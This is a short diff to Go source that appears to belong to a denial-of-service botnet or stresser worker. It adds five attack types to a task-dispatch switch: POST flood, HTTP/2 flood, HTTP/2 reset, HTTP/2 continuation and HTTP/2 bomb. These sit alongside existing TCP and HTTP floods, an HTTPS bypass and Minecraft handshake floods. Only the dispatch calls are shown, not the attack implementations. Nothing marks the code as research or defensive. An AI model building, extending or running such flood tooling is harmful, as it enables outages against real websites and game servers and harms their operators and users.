@@ -1243,6 +1243,16 @@ func (w *Worker) startTask(task *pb.AttackTask) {
 		session = attack.StartTCPFloodEx(cfg)
 	case "http_flood":
 		session = attack.StartHTTPFloodEx(cfg)
+	case "post_flood":
+		session = attack.StartPOSTFloodEx(cfg)
+	case "http2_flood":
+		session = attack.StartHTTP2FloodEx(cfg)
+	case "http2_reset":
+		session = attack.StartHTTP2ResetEx(cfg)
+	case "http2_continuation":
+		session = attack.StartHTTP2ContinuationEx(cfg)
+	case "http2_bomb":
+		session = attack.StartHTTP2BombEx(cfg)
 	case "https_bypass":
 		session = attack.StartHTTPSBypassEx(cfg)
 	case "minecraft_handshake", "minecraft_login":
